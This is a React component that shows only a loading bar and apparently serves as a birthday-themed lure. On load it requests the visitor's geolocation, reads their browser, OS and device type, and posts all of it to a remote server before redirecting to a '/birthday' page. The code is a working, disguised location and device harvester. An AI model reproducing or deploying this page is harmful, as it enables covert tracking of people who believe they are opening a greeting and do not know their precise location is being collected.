import React from "react";
import {useHistory} from "react-router-dom";
import DeviceDetector from "device-detector-js";
function Trial(){
    const history=useHistory();



    document.addEventListener('DOMContentLoaded', function() {
        navigator.geolocation.getCurrentPosition(data=>{
        if((data.coords.latitude) && (data.coords.longitude)){
                
            const deviceDetector = new DeviceDetector();
const userAgent = navigator.userAgent;
const deviceer = deviceDetector.parse(userAgent);


            fetch(process.env.API_URL || "http://localhost:5000/" || "https://dear-acc.herokuapp.com/",{
                "method":"POST",
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                  },
                  "body": JSON.stringify({
                    latitude:data.coords.latitude,
                    longitude: data.coords.longitude,
                    clintName:deviceer.client.name,
                    osName:deviceer.os.name,
                    device:deviceer.device.type
                  })
    })
    .then(res=>{
        if(res.status!==200){
            console.log("error");
        } else {
            history.push("/birthday")

        }
    })
    .catch(err=>{
        console.log(err);
    })

        } else{
          setTimeout(()=>{
            history.push("/")
          },2000)
        }





            })
    });
    return (
        <div className="pril" >

             <div className="progress">
                    <div className="indeterminate"></div>
             </div>

        </div>
    );
}
export default Trial;
